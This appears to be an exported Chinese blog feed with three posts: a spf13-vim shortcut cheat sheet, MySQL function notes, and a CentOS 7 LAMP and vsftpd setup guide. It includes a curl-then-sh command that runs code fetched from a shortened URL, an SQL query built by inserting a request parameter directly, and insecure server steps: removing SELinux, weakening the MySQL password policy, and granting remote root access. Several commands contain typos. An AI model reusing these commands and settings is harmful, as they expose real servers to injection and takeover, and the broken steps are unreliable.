<h3 id="Linux-nix-Mac-OSX-Installation"><a href="#Linux-nix-Mac-OSX-Installation" class="headerlink" title="Linux, *nix, Mac OSX Installation"></a>Linux, *nix, Mac OSX Installation</h3><p>The easiest way to install spf13-vim is to use our <span class="exturl" data-url="aHR0cHM6Ly9qLm1wL3NwZjEzLXZpbTM=" title="https://j.mp/spf13-vim3">automatic installer<i class="fa fa-external-link"></i></span> by simply copying and pasting the following line into a terminal. This will install spf13-vim and backup your existing vim configuration. If you are upgrading from a prior version (before 3.0) this is also the recommended installation.</p>
<p><em>Requires Git 1.7+ and Vim 7.3+</em></p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">curl https://j.mp/spf13-vim3 -L &gt; spf13-vim.sh &amp;&amp; sh spf13-vim.sh</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<p>If you have a bash-compatible shell you can run the script directly:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sh &lt;(curl https://j.mp/spf13-vim3 -L)</span><br></pre></td></tr></table></figure></div></p>
<h2 id="NERDCommenter注释工具"><a href="#NERDCommenter注释工具" class="headerlink" title="NERDCommenter注释工具"></a><a href="#NERDCommenter注释工具" title="NERDCommenter注释工具"></a><span class="exturl" data-url="aHR0cDovL3NwZjEzLmNvbS9wb3N0L3ZpbS1wbHVnaW5zLW5lcmQtY29tbWVudGVy" title="http://spf13.com/post/vim-plugins-nerd-commenter">NERDCommenter<i class="fa fa-external-link"></i></span>注释工具</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>,c<code>&lt;Space&gt;</code></td>
<td>切换当前行或选中内容是否注释，根据首行判断</td>
</tr>
<tr>
<td>,ci</td>
<td>切换当前行或选中内容是否注释，每行自己判断</td>
</tr>
<tr>
<td>,cs</td>
<td>有格式地注释</td>
</tr>
<tr>
<td>,cy</td>
<td>复制内容，然后注释</td>
</tr>
<tr>
<td>,ca</td>
<td>在行末添加注释符并进入insert mode</td>
</tr>
<tr>
<td>,cl</td>
<td>在行首添加注释符并进入insert mode</td>
</tr>
<tr>
<td>,ca</td>
<td>在两种注释符之间切换，如/**/和//</td>
</tr>
</tbody>
</table>
<h2 id="NERDTree文件导航工具"><a href="#NERDTree文件导航工具" class="headerlink" title="NERDTree文件导航工具"></a><a href="#NERDTree文件导航工具" title="NERDTree文件导航工具"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Njcm9vbG9vc2UvbmVyZHRyZWUvYmxvYi9tYXN0ZXIvZG9jL05FUkRfdHJlZS50eHQ=" title="https://github.com/scrooloose/nerdtree/blob/master/doc/NERD_tree.txt">NERDTree<i class="fa fa-external-link"></i></span>文件导航工具</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl+e</td>
<td>打开/关闭NERDTree</td>
</tr>
<tr>
<td>?</td>
<td>显示快速帮助</td>
</tr>
<tr>
<td>o或Ctrl+R</td>
<td>打开文件、目录和书签</td>
</tr>
<tr>
<td>go</td>
<td>打开选中文件，不过光标仍在NERDTree中</td>
</tr>
<tr>
<td>t</td>
<td>在新tab中打开选中节点/书签</td>
</tr>
<tr>
<td>T</td>
<td>功能与t相同，不过焦点仍在当前tab</td>
</tr>
<tr>
<td>i</td>
<td>在新split打开选中文件</td>
</tr>
<tr>
<td>gi</td>
<td>与i相同，不过光标仍在NERDTree中</td>
</tr>
<tr>
<td>s</td>
<td>在新vsplit中打开选中文件</td>
</tr>
<tr>
<td>gs</td>
<td>与s相同，不过光标仍在NERDTree中</td>
</tr>
<tr>
<td>O</td>
<td>打开选中目录所有子目录</td>
</tr>
<tr>
<td>x</td>
<td>关闭当前节点父节点</td>
</tr>
<tr>
<td>X</td>
<td>关闭当前节点所有子节点</td>
</tr>
<tr>
<td>D</td>
<td>删除当前书签</td>
</tr>
<tr>
<td>P</td>
<td>跳到根节点</td>
</tr>
<tr>
<td>p</td>
<td>跳到当前节点父节点</td>
</tr>
<tr>
<td>K</td>
<td>跳到本层级第一个节点</td>
</tr>
<tr>
<td>J</td>
<td>跳到本层级最后一个节点</td>
</tr>
<tr>
<td>C</td>
<td>设置选中目录为根结点</td>
</tr>
<tr>
<td>u</td>
<td>根结点向上跳出一级</td>
</tr>
<tr>
<td>U</td>
<td>与u相同，只是老根结点保持打开</td>
</tr>
<tr>
<td>r</td>
<td>刷新当前目录所有子目录</td>
</tr>
<tr>
<td>R</td>
<td>刷新当前根目录所有子目录</td>
</tr>
<tr>
<td>m</td>
<td>显示NERDTree的菜单</td>
</tr>
<tr>
<td>cd</td>
<td>将当前工作目录改为选中节点</td>
</tr>
<tr>
<td>CD</td>
<td>将根结点改为当前工作目录</td>
</tr>
<tr>
<td>f</td>
<td>切换是否打开文件过滤</td>
</tr>
<tr>
<td>F</td>
<td>切换是否显示文件</td>
</tr>
<tr>
<td>B</td>
<td>切换书签列表是否显示</td>
</tr>
<tr>
<td>A</td>
<td>最大最小化NERDTree窗口</td>
</tr>
</tbody>
</table>
<h2 id="ctrlp搜索file-buf-mru-tag工具"><a href="#ctrlp搜索file-buf-mru-tag工具" class="headerlink" title="ctrlp搜索file/buf/mru/tag工具"></a><a href="#ctrlp搜索file-buf-mru-tag工具" title="ctrlp搜索file/buf/mru/tag工具"></a><span class="exturl" data-url="aHR0cDovL2tpZW4uZ2l0aHViLmlvL2N0cmxwLnZpbS8=" title="http://kien.github.io/ctrlp.vim/">ctrlp<i class="fa fa-external-link"></i></span>搜索file/buf/mru/tag工具</h2><p>mru是Most Recently Used。</p>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl+p</td>
<td>打开ctrlp并定位在file mode</td>
</tr>
<tr>
<td>?</td>
<td>查看帮助</td>
</tr>
<tr>
<td>F5</td>
<td>刷新当前目录</td>
</tr>
<tr>
<td>Ctrl+f,Ctrl+d</td>
<td>在mode间左右切换</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td>切换正则表达式mode</td>
</tr>
<tr>
<td>Ctrl+j,Ctrl+k</td>
<td>在搜索结果间上下移动</td>
</tr>
<tr>
<td>Ctrl+t</td>
<td>在新tab打开选中结果</td>
</tr>
<tr>
<td>Ctrl+v</td>
<td>在新vsplit打开选中结果</td>
</tr>
<tr>
<td>Ctrl+x</td>
<td>在新split打开选中结果</td>
</tr>
<tr>
<td>Ctrl+z then Ctrl+o</td>
<td>先标记多个文件，然后一起打开</td>
</tr>
<tr>
<td>..</td>
<td>向上跳一层级</td>
</tr>
<tr>
<td>:25</td>
<td>跳转到文件第25行</td>
</tr>
<tr>
<td><code>:/any\:\ string</code></td>
<td>跳转到第一个<code>any: string</code></td>
</tr>
<tr>
<td>:+setfiletype\ myfiletype &#124; 25</td>
<td>将文件类型设为myfiletype并跳转到第25行</td>
</tr>
<tr>
<td><code>:diffthis</code></td>
<td>对前4个用Ctrl+z标记的文件比较不同</td>
</tr>
</tbody>
</table>
<h2 id="Surround处理所有”‘-’”等"><a href="#Surround处理所有”‘-’”等" class="headerlink" title="Surround处理所有”‘{[()]}’”等"></a><a href="#Surround处理所有”‘-’”等" title="Surround处理所有”‘{[()]}’”等"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Rwb3BlL3ZpbS1zdXJyb3VuZA==" title="https://github.com/tpope/vim-surround">Surround<i class="fa fa-external-link"></i></span>处理所有”‘{[()]}’”等</h2><p>最适用于HTML/XML文件。</p>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>ds.</td>
<td>删除包围结构。当光标在<code>(Hello *world)</code>中处于*位置时按<code>ds)</code>会得到结果Hello world!</td>
</tr>
<tr>
<td>cs.</td>
<td>改变包围结构。当光标在<code>(Hello *world)</code>中处于*位置时按<code>cs)]</code>会得到结果[Hello world!]</td>
</tr>
<tr>
<td>ysiw.</td>
<td>包围当前词。当光标在<code>Hello w*orld</code>中处于*位置时按<code>ysiw)</code>会得到结果Hello (world)!</td>
</tr>
<tr>
<td>yss.</td>
<td>包围当前行。当光标在<code>Hello w*orld</code>中处于*位置时按<code>yss)</code>会得到结果(Hello world!)</td>
</tr>
</tbody>
</table>
<h2 id="neocomplcache自动补全工具"><a href="#neocomplcache自动补全工具" class="headerlink" title="neocomplcache自动补全工具"></a><a href="#neocomplcache自动补全工具" title="neocomplcache自动补全工具"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Nob3Vnby9uZW9jb21wbGNhY2hlLnZpbQ==" title="https://github.com/Shougo/neocomplcache.vim">neocomplcache<i class="fa fa-external-link"></i></span>自动补全工具</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl+u或Ctrl+n或Ctrl+p</td>
<td>在原始输入与补全方案间切换</td>
</tr>
</tbody>
</table>
<h2 id="Fugitive集成git工具"><a href="#Fugitive集成git工具" class="headerlink" title="Fugitive集成git工具"></a><a href="#Fugitive集成git工具" title="Fugitive集成git工具"></a>Fugitive集成git工具</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>,gs</td>
<td>查看git状态<code>:Gstatus</code></td>
</tr>
<tr>
<td>,gd</td>
<td>:Gdiff</td>
</tr>
<tr>
<td>,gc</td>
<td>:Gcommit</td>
</tr>
<tr>
<td>,gb</td>
<td>:Gblame</td>
</tr>
<tr>
<td>,gl</td>
<td>:Glog</td>
</tr>
<tr>
<td>,gp</td>
<td>:Git push</td>
</tr>
</tbody>
</table>
<h2 id="Tabularize-对齐工具"><a href="#Tabularize-对齐工具" class="headerlink" title="[Tabularize]对齐工具"></a><a href="#Tabularize-对齐工具" title="[Tabularize]对齐工具"></a>[Tabularize]对齐工具</h2><h2 id="Tagbar-Tag工具"><a href="#Tagbar-Tag工具" class="headerlink" title="[Tagbar]Tag工具"></a><a href="#Tagbar-Tag工具" title="[Tagbar]Tag工具"></a>[Tagbar]Tag工具</h2><p>使用前要先安装exuberant-ctags。执行命令<code>sudo apt-get install exuberant-ctags</code>。</p>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>,tt</td>
<td>打开关闭tagbar，显示文件函数</td>
</tr>
<tr>
<td>?</td>
<td>显示帮助</td>
</tr>
<tr>
<td>p</td>
<td>跳转到tag所在处，光标留在tagbar</td>
</tr>
<tr>
<td>P</td>
<td>在预览窗口打开tag</td>
</tr>
<tr>
<td>Space</td>
<td>显示tag声明</td>
</tr>
<tr>
<td>o</td>
<td>切换文件夹打开关闭状态</td>
</tr>
<tr>
<td>zj</td>
<td>跳转到下一文件夹</td>
</tr>
<tr>
<td>zk</td>
<td>跳转到上一文件夹</td>
</tr>
<tr>
<td>s</td>
<td>改变排序方式</td>
</tr>
<tr>
<td>x</td>
<td>最大最小化窗口</td>
</tr>
<tr>
<td>q</td>
<td>关闭窗口</td>
</tr>
</tbody>
</table>
<h2 id="EasyMotion跳转工具"><a href="#EasyMotion跳转工具" class="headerlink" title="EasyMotion跳转工具"></a><a href="#EasyMotion跳转工具" title="EasyMotion跳转工具"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xva2FsdG9nL3ZpbS1lYXN5bW90aW9u" title="https://github.com/Lokaltog/vim-easymotion">EasyMotion<i class="fa fa-external-link"></i></span>跳转工具</h2><table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>,,</td>
<td>后跟任何正常功能的motion键</td>
</tr>
</tbody>
</table>
<p>[本文转自] <span class="exturl" data-url="aHR0cDovL2NvbmdsYW5nLmdpdGh1Yi5pby8yMDE1LzA0LzA2L3NwZjEzLXZpbS1jaGVhdC1zaGVldC8=" title="http://conglang.github.io/2015/04/06/spf13-vim-cheat-sheet/">http://conglang.github.io/2015/04/06/spf13-vim-cheat-sheet/<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>「mySQL」mysql笔记-mysql函数运用</title>
    <url>/2018/05/16/%E3%80%90mySQL%E3%80%91mysql%E7%AC%94%E8%AE%B0-mysql%E5%87%BD%E6%95%B0%E8%BF%90%E7%94%A8/</url>
    <content><![CDATA[<h4 id="主副表查询"><a href="#主副表查询" class="headerlink" title="主副表查询"></a>主副表查询</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">SELECT *,(select count(&#123;$dbPrefix&#125;vedios.pid) from jdn_vedios where &#123;$dbPrefix&#125;vedios.pid=&#123;$dbPrefix&#125;column.id) as pidCount	FROM `&#123;$dbPrefix&#125;column` WHERE `pid` = 197</span><br></pre></td></tr></table></figure></div>
<h4 id="加法运算"><a href="#加法运算" class="headerlink" title="加法运算"></a>加法运算</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&quot;UPDATE `&#123;$this-&gt;DbPrefix&#125;videos` SET `views`=views+1 WHERE `id` = &#123;$param[&apos;id&apos;]&#125;&quot;</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<h4 id="子表查询"><a href="#子表查询" class="headerlink" title="子表查询"></a>子表查询</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT</span><br><span class="line">       *,</span><br><span class="line">       (SELECT group_concat(CONCAT(&apos; &apos;,&#123;$prefix&#125;fengge.title,&apos; &apos;)) FROM &#123;$prefix&#125;fengge WHERE FIND_IN_SET(&#123;$prefix&#125;fengge.id,&#123;$prefix&#125;brand.fengge)) as fengge_str, -- 查风格中文</span><br><span class="line">       (SELECT group_concat(CONCAT(&apos; &apos;,&#123;$prefix&#125;dingwei.title,&apos; &apos;)) FROM &#123;$prefix&#125;dingwei WHERE FIND_IN_SET(&#123;$prefix&#125;dingwei.id,&#123;$prefix&#125;brand.dingwei)) as dingwei_str, -- 查定位中文</span><br><span class="line">       (SELECT group_concat(CONCAT(&apos; &apos;,&#123;$prefix&#125;touzi.title,&apos; &apos;)) FROM &#123;$prefix&#125;touzi WHERE FIND_IN_SET(&#123;$prefix&#125;touzi.id,&#123;$prefix&#125;brand.touzi)) as touzi_str, -- 查投资</span><br><span class="line">       (SELECT group_concat(CONCAT(&apos; &apos;,&#123;$prefix&#125;zhengce.title,&apos; &apos;)) FROM &#123;$prefix&#125;zhengce WHERE FIND_IN_SET(&#123;$prefix&#125;zhengce.id,&#123;$prefix&#125;brand.zhengce)) as zhengce_str, -- 查政策</span><br><span class="line">       (SELECT group_concat(CONCAT(&apos; &apos;,&#123;$prefix&#125;diqu.title,&apos; &apos;)) FROM &#123;$prefix&#125;diqu WHERE FIND_IN_SET(&#123;$prefix&#125;diqu.id,&#123;$prefix&#125;brand.diqu)) as diqu_str -- 地区</span><br><span class="line">       FROM `&#123;$prefix&#125;brand`</span><br><span class="line">       WHERE `username` = &apos;olisi&apos;</span><br><span class="line">       LIMIT 1&quot;;</span><br><span class="line">       return ($this-&gt;query($sql))[0];</span><br></pre></td></tr></table></figure></div>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1Z2FuZ194aW1pL2FydGljbGUvZGV0YWlscy82NjY0NzQ4" title="https://blog.csdn.net/sugang_ximi/article/details/6664748">mysql常用函数<i class="fa fa-external-link"></i></span></p>
<h4 id="不重复查询函数-distinct和GROUP-BY"><a href="#不重复查询函数-distinct和GROUP-BY" class="headerlink" title="不重复查询函数 distinct和GROUP BY"></a>不重复查询函数 <code>distinct</code>和<code>GROUP BY</code></h4><p>  &emsp;<code>distinct</code>和<code>GROUP BY</code>用于查找单个字段不重复,如果个字段有多个相同值就以第一个为准,相对于<code>distinct</code>的只输出单个字段的数据,<code>GROUP BY</code>能输出以单个字段不重复的所有数据相较下,<code>GROUP BY</code>的操作会丰富些。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"> CREATE DATABASE IF NOT EXISTS `debug`;</span><br><span class="line"> USE `debug`;</span><br><span class="line"></span><br><span class="line"> CREATE TABLE IF NOT EXISTS `func_distinct`(</span><br><span class="line">    `id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">    `title` VARCHAR(100) NOT NULL COMMENT &apos;标题&apos;,</span><br><span class="line">    PRIMARY KEY ( `id`  )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line"> INSERT INTO `func_distinct` (`id`,`title`) VALUES ( NULL,&apos;标题1&apos;);</span><br><span class="line"> INSERT INTO `func_distinct` (`id`,`title`) VALUES ( NULL,&apos;标题1&apos;);</span><br><span class="line"> INSERT INTO `func_distinct` (`id`,`title`) VALUES ( NULL,&apos;标题2&apos;);</span><br><span class="line"> INSERT INTO `func_distinct` (`id`,`title`) VALUES ( NULL,&apos;标题2&apos;);</span><br><span class="line"></span><br><span class="line"> SELECT distinct `title` from `func_distinct`;         /*输出单个title字段*/</span><br><span class="line"> SELECT COUNT(distinct `title`) from `func_distinct`;  /*统计不重复标题的数量*/</span><br><span class="line"> SELECT * FROM `func_distinct` GROUP BY `title`;       /*输出单个title字段*/</span><br><span class="line"> SELECT COUNT(*) FROM `func_distinct` GROUP BY `title`;/*统计各个重复标题的数量*/</span><br></pre></td></tr></table></figure></div></p>
<h4 id="分割符查询函数-FIND-IN-SET"><a href="#分割符查询函数-FIND-IN-SET" class="headerlink" title="分割符查询函数 FIND_IN_SET"></a>分割符查询函数 <code>FIND_IN_SET</code></h4><p>  &emsp;<code>FIND_IN_SET</code>用于查找字符中被”,”分割的字串,如<code>SELECT FIND_IN_SET(&#39;b&#39;,&#39;a,b,c,d&#39;)</code>;会返回<code>b</code>;它同<code>like</code>查询不一样，<code>FIND_IN_SET</code>要准确得多。以下实例查找<code>green</code>标签的数据:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"> CREATE DATABASE IF NOT EXISTS `debug`; /*测试库*/</span><br><span class="line"> USE `debug`;</span><br><span class="line"></span><br><span class="line"> CREATE TABLE IF NOT EXISTS `func_find_in_set`(</span><br><span class="line">    `id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">    `tag` VARCHAR(100) NOT NULL COMMENT &apos;标签&apos;,</span><br><span class="line">    PRIMARY KEY ( `id`  )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line"> INSERT INTO `func_find_in_set` (`id`,`tag`) VALUES ( NULL,&apos;red,yellow&apos;);</span><br><span class="line"> INSERT INTO `func_find_in_set` (`id`,`tag`) VALUES ( NULL,&apos;red,green&apos;);</span><br><span class="line"> INSERT INTO `func_find_in_set` (`id`,`tag`) VALUES ( NULL,&apos;green,white&apos;);</span><br><span class="line"> INSERT INTO `func_find_in_set` (`id`,`tag`) VALUES ( NULL,&apos;yellow,pink&apos;);</span><br><span class="line"></span><br><span class="line"> SELECT * FROM `func_find_in_set` WHERE FIND_IN_SET(&apos;green&apos;,func_find_in_set.tag); /*查找标签为green的数据*/</span><br><span class="line"> SELECT COUNT(*) FROM `func_find_in_set` WHERE FIND_IN_SET(&apos;green&apos;,func_find_in_set.tag); /*统计green标签的数量*/</span><br></pre></td></tr></table></figure></div></p>
<h4 id="字符替换-REPLACE"><a href="#字符替换-REPLACE" class="headerlink" title="字符替换 REPLACE"></a>字符替换 <code>REPLACE</code></h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">UPDATE `table` SET `colum`=REPLACE(`colum`,&apos;toReplaceString&apos;,&apos;targetString&apos;)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>mySQL</category>
      </categories>
      <tags>
        <tag>mySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」lamp配置</title>
    <url>/2018/05/15/lamp%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>打造高性能计算型服务器<br>    说明原因:为什么打造属于自己的计算型高性能服务器？因为别人的服务器出问题了，找不到原因感到不爽！理由2：使用第三方的面板固然方便，但(我也不想)，功能越强会开启大量的进程，占用大量的计算资源。<br>    环境:centos 7 最小化安装<br>    <a id="more"></a></p>
<h2 id="一-安装前准备"><a href="#一-安装前准备" class="headerlink" title="一,安装前准备"></a>一,安装前准备</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum install wget</span></span><br><span class="line"><span class="comment"># yum install vim //安装这个就不用我说了</span></span><br><span class="line"><span class="comment"># yum remove seliux*  //卸载selinux软件。后期开发这个安装机制会对后面开发有影响。所以干脆卸了。</span></span><br></pre></td></tr></table></figure></div>
<!--more-->
<h2 id="二-安装apache"><a href="#二-安装apache" class="headerlink" title="二,安装apache"></a>二,安装apache</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># yum install httpd</span><br><span class="line">　　# systemctl enable httpd.servcie //加入开机启动</span><br><span class="line">　 # firewall-cmd --zone=public --add-port=80/tcp --permanent //防火墙打开80</span><br><span class="line">　 #  tcping [ip] [port] //使用tcping工具查看端口是否开启(tcping当前没有yum包。要自己找安装包来安装。或直接在浏览器输入ip，进入apache的欢页面。就成功了)</span><br><span class="line">　　# mkdir vhost-conf</span><br><span class="line">　　# echo &quot;Include vhost-conf/*.conf&quot; &amp;&gt;&gt; /etc/httpd/conf/httpd.conf //包含vhost-conf目录下的.conf后缀的配置文件。为了便于区分，建议每个站点做1个配置文件，如:站点test.com 可以是test_com.conf</span><br><span class="line">　　在vhost-conf 新建站点test.com的配置文件：</span><br><span class="line">　　　　# vim test_com　　　　　　</span><br><span class="line">　　　　　　&lt;VirtualHost *:80&gt;</span><br><span class="line">　　　　　　　　ServerName test.com</span><br><span class="line">　　　　　　　　ServerAlias test2.com www.test1.com  #多域名</span><br><span class="line">　　　　　　　　DocumentRoot /var/www/html/test</span><br><span class="line">　　　　　　　　DirectoryIndex index.html</span><br><span class="line">　　　　　　&lt;/VirtualHost&gt;</span><br><span class="line">　　　　　　&lt;Directory &quot;/var/www/html/test&quot;&gt;</span><br><span class="line">　　　　　　　　Options +Includes -Indexes</span><br><span class="line">　　　　　　　　llowOverride All</span><br><span class="line">　　　　　　　　Order Deny,Allow</span><br><span class="line">　　　　　　　　Allow from All</span><br><span class="line">　　　　　　&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">　　　　</span><br><span class="line">　　　　# mkdir /var/www/html/test //在 /var/www/html/新建目录test 网站的文件就是放置在这里</span><br><span class="line">　　　　 (如果就想将网站文件放置在/var/www/html/test/ 可以在这在这新建一个软链接将达到将文件放置在你想放的地方。如: #mkdir -p /www/test/&amp;&amp; rm -rf /var/www/html/test/ &amp;&amp; ln -s /www/test /var/www/html/test/后面将网站文件放置在/www/test/)</span><br></pre></td></tr></table></figure></div>
<h2 id="三-安装mysql"><a href="#三-安装mysql" class="headerlink" title="三,安装mysql"></a>三,安装mysql</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">　　　　# wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm //获取官方yum包</span><br><span class="line">　　　　# rpm -Uvh mysql57-community-release-el7-10.noarch.rpm //更新rpm包</span><br><span class="line">　　　　# yum install  -y  mysql-community-server //安装msyql</span><br><span class="line">　　　　# systemctl start msyqld.service //启动</span><br><span class="line">　　　　# firewall-cmd --zone=public --add-port=3360/tcp --permanent //启用3306端口</span><br><span class="line">　　　　# systemctl resart firewalld.servcie //重启防火墙</span><br><span class="line">　　　　# firewall-cmd --zone=public --list-ports //查看3306端口是启用</span><br><span class="line">　　　　# grep &apos;temporary password&apos; /var/log/mysqld.log //这种安装方式是有密码的，这个可以查看临时密码，帐户: root</span><br><span class="line">　　　　系统会提示你修改修改密码:ERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.</span><br><span class="line">　　　　msyql&gt;SET PASSWORD = PASSWORD(&apos;root&apos;); //设置当前密码为root</span><br><span class="line">　　　　如果修改密码失败:ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</span><br><span class="line">　　　　修改2个全局变量：</span><br><span class="line">　　　　　　mysql&gt; set global validate_password_policy=0; //修改validate_password_policy参数</span><br><span class="line">　　　　　　msyql&gt;  set global validate_password_length=1; //修改密码默认长度</span><br><span class="line">　　　　msyql&gt;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;my password&apos; WITH GRANT OPTION; //授权远程登录</span><br><span class="line">　　　　mysl&gt;FLUSH  PRIVILEGES; //刷新系统配置</span><br><span class="line">　　　　设置数据库和服务器编码格式:</span><br><span class="line">　　　　　　在 /etc/my.cnf 的mysqld 标签下加入</span><br><span class="line">　　　　　　# systemctl restart mysqld.service //重启</span><br><span class="line">　　　　　　登录进mysql:</span><br><span class="line">　　　　　　　　mysql&gt; show variables like &apos;%character%&apos;; //查看编码格式</span><br><span class="line">　　　　　　　　mysql&gt; status; //查看基本信息</span><br></pre></td></tr></table></figure></div>
<h2 id="四，安装php-7"><a href="#四，安装php-7" class="headerlink" title="四，安装php 7"></a>四，安装php 7</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">　　　　# yum -y install epel-release  //安装epel仓库</span><br><span class="line">　　　　# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm //更新yum包</span><br><span class="line"></span><br><span class="line">　　　　# 基础</span><br><span class="line">　　　　yum install php71w -y</span><br><span class="line">　　　　# nginx连接使用</span><br><span class="line">　　　　yum install php71w-fpm -y</span><br><span class="line">　　　　# 宽字节</span><br><span class="line">　　　　yum install php71w-mbstring -y</span><br><span class="line">　　　　 # mysql相关</span><br><span class="line">　　　　 yum install php71w-mysqlnd -y</span><br><span class="line">　　　　 # redis扩展</span><br><span class="line">　　　　yum install php71w-pecl-redis -y</span><br><span class="line">　　　　 # 加密使用</span><br><span class="line">　　　　yum install php71w-mcrypt -y</span><br><span class="line">　　　　# 性能加速php5.5 以上使用</span><br><span class="line">　　　　yum install php71w-opcache -y</span><br></pre></td></tr></table></figure></div>
<h2 id="五，安装vsftpd"><a href="#五，安装vsftpd" class="headerlink" title="五，安装vsftpd"></a>五，安装vsftpd</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">　　　　（这个配置有些烦，先点明目标：指定用户指定目录！）</span><br><span class="line">　　　　# yum install</span><br><span class="line">　　　　# systemctl enable vsftpd.service //开机启动</span><br><span class="line">　　　　# firewall-cmd --zone=public --add-port=21/tcp --permanent //开启21端口</span><br><span class="line">　　　　# systemctl restart firewalld.service //重启防火墙</span><br><span class="line">　　　　# vim /etc/vsftpd/vsftpd.conf //配置vsftpd.conf文件</span><br><span class="line">　　　　　　#禁匿名登录</span><br><span class="line">　　　　　　anonymous_enable=NO</span><br><span class="line">　　　　　　#注释（禁止匿名上传)</span><br><span class="line">　　　　　　#anon_upload_enable=YES</span><br><span class="line">　　　　　　#注释（禁止匿名修改)</span><br><span class="line">　　　　　　</span><br><span class="line">　　　　　　#anon_mkdir_write_enable=YES</span><br><span class="line">　　　　　　chroot_local_user=NO //名单外的帐户禁访问主目录上级目录</span><br><span class="line">　　　　　　chroot_list_enable=YES # 启用名单</span><br><span class="line">　　　　　　chroot_list_file=/etc/vsftpd/chroot_list  #禁止访问上级目录名单</span><br><span class="line">　　　　　　vim /etc/vsftpd/chroot_list //新建 chroot_list名单</span><br><span class="line">　　　　　　　　wuChuHeng #写入名单　　</span><br><span class="line">　　　　</span><br><span class="line">　　　　　　</span><br><span class="line">　　　　　　allow_writeable_chroot=YES //加入这行,在外部并执行 chmod a-w /home/user/ 写上帐号主目录</span><br><span class="line">　　　　　　tcp_wrappers=YES //被动模式，真实原理不清，实测这样访问速度更快</span><br><span class="line">pasv_enable=YES</span><br><span class="line">　　　　　　